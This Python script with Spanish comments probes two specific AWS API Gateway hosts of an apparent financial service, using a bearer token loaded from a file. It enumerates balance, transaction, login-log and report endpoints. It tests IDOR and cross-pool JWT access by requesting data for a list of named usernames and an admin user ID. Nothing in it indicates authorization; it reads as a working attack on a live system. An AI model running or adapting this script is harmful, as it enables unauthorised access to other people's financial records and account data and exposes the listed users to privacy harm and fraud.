import subprocess, json, sys, os
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

def log(msg): print(f"[*] {msg}", flush=True)

with open('pld_tokens.json') as f:
    tokens = json.load(f)
ID_TOKEN = tokens['id_token']

PLD_GW = "https://0b8yuzev63.execute-api.us-east-1.amazonaws.com/prod"
APP_GW = "https://vi9nofsm5e.execute-api.us-east-1.amazonaws.com/production"

def api(method, base, path, payload=None, timeout=12):
    cmd = [
        'curl.exe', '-s', '-m', str(timeout), '--noproxy', '*',
        '-X', method,
        '-H', f'Authorization: Bearer {ID_TOKEN}',
        '-H', 'Content-Type: application/json',
    ]
    if payload:
        cmd.extend(['-d', json.dumps(payload)])
    cmd.extend(['-w', '\n__HTTP_CODE:%{http_code}__', f'{base}{path}'])
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
    output = r.stdout
    if '__HTTP_CODE:' in output:
        parts = output.rsplit('__HTTP_CODE:', 1)
        body = parts[0].strip()
        code = parts[1].replace('__', '').strip()
    else:
        body = output.strip()
        code = '?'
    try:
        data = json.loads(body) if body else {}
    except:
        data = {'raw': body[:500]}
    return code, data

# Usernames conocidos
users = [
    'ernestomandadito', 'gustavoabcdgj84', 'jaimedex02', 'gustavofina84',
    'gustavopdg84', 'RECIKLAN', 'intervo', 'tperezb', 'baguilar',
    'jaimeluisaguilar', 'Fracter', 'juliecg', 'JORGEGUZMAN', 'suqiee'
]

# Admin user ID
ADMIN_UID = "24a8c4f8-d051-7097-6fbf-66dda55ddbad"

log("=" * 60)
log("SALDOS Y CUENTAS")
log("=" * 60)

# 1. PLD: endpoints de saldo/cuenta
log("\n[1] PLD — Endpoints de saldo")
pld_balance_paths = [
    '/api/v1/transaction/amounts',
    '/api/v1/transaction/usersAmount',
    '/api/v1/transaction/summary',
    '/api/v1/user/account/frozen-amount',
]
for path in pld_balance_paths:
    code, data = api('GET', PLD_GW, path)
    preview = json.dumps(data)[:300] if isinstance(data, dict) else str(data)[:300]
    log(f"  GET {path}: {code} | {preview[:250]}")

# 2. PLD: POST con paginación
log("\n[2] PLD — POST con paginación")
pld_post_paths = [
    ('/api/v1/transaction/amounts', {}),
    ('/api/v1/transaction/usersAmount', {}),
    ('/api/v1/transaction/paginated', {"page": 1, "limit": 10}),
    ('/api/v1/transaction/global', {"page": 1, "limit": 10}),
    ('/api/v1/transaction/unapproved/paginated', {"page": 1, "limit": 10}),
    ('/api/v1/transaction/transactionProfile', {}),
    ('/api/v1/transaction/transactionality', {}),
]
for path, payload in pld_post_paths:
    code, data = api('POST', PLD_GW, path, payload)
    preview = json.dumps(data)[:300] if isinstance(data, dict) else str(data)[:300]
    log(f"  POST {path}: {code} | {preview[:250]}")

# 3. PLD: user summary con query params (probar IDOR)
log("\n[3] PLD — User summary IDOR")
for username in users[:5]:
    for path in [
        f'/api/v1/user/summary?username={username}',
        f'/api/v1/user/summary?user={username}',
        f'/api/v1/user?username={username}',
    ]:
        code, data = api('GET', PLD_GW, path)
        preview = json.dumps(data)[:200] if isinstance(data, dict) else str(data)[:200]
        if code != '404' and 'Cannot GET' not in str(data):
            log(f"  {path}: {code} | {preview[:180]}")
            break

# 4. PLD: user info con POST (username en body)
log("\n[4] PLD — User info POST")
for username in users[:5]:
    code, data = api('POST', PLD_GW, '/api/v1/user', {"username": username})
    preview = json.dumps(data)[:300] if isinstance(data, dict) else str(data)[:300]
    log(f"  {username}: {code} | {preview[:250]}")

# 5. APP API con nuestro JWT PLD (cross-pool?)
log("\n[5] APP API — Cross-pool JWT test")
app_paths = [
    '/api/v1/account',
    '/api/v1/account/estadocuenta',
    '/api/v1/profile',
    '/api/v1/profile/clabe',
    '/api/v1/beneficiarios',
]
for path in app_paths:
    code, data = api('GET', APP_GW, path)
    preview = json.dumps(data)[:300] if isinstance(data, dict) else str(data)[:300]
    log(f"  GET {path}: {code} | {preview[:250]}")

# 6. PLD: frozen amounts con user_id
log("\n[6] PLD — Frozen amounts por user")
for path in [
    f'/api/v1/user/account/frozen-amount?user_id={ADMIN_UID}',
    f'/api/v1/user/account/frozen-amount/log',
    f'/api/v1/user/account/frozen-amount/log?user_id={ADMIN_UID}',
]:
    code, data = api('GET', PLD_GW, path)
    preview = json.dumps(data)[:300] if isinstance(data, dict) else str(data)[:300]
    log(f"  {path.split('/prod')[0]}: {code} | {preview[:250]}")

# 7. PLD: transaction report con username específico
log("\n[7] PLD — Transaction report por user")
for username in ['ernestomandadito', 'gustavoabcdgj84', 'RECIKLAN']:
    code, data = api('GET', PLD_GW,
        f'/api/v1/report/reporte-transacciones?fechaInicio=2026-01-01&fechaFin=2026-07-25&username={username}')
    if isinstance(data, dict) and data.get('result'):
        result = data['result']
        lines = result.split('\n') if isinstance(result, str) else []
        log(f"  {username}: {code} | {len(lines)} transacciones")
    else:
        preview = json.dumps(data)[:200]
        log(f"  {username}: {code} | {preview[:180]}")

# 8. PLD: user bitácora y log-ins
log("\n[8] PLD — Bitácora y logins")
for path in [
    '/api/v1/user/bitacora',
    '/api/v1/user/log-ins',
    '/api/v1/user/outdated',
    '/api/v1/report/inicios-sesion',
]:
    code, data = api('GET', PLD_GW, path)
    preview = json.dumps(data)[:300] if isinstance(data, dict) else str(data)[:300]
    log(f"  GET {path}: {code} | {preview[:250]}")

# 9. Transaction months (resumen mensual?)
log("\n[9] PLD — Transaction months")
code, data = api('GET', PLD_GW, '/api/v1/transaction/months')
preview = json.dumps(data)[:500] if isinstance(data, dict) else str(data)[:500]
log(f"  {code} | {preview[:400]}")

log("\nFIN.")
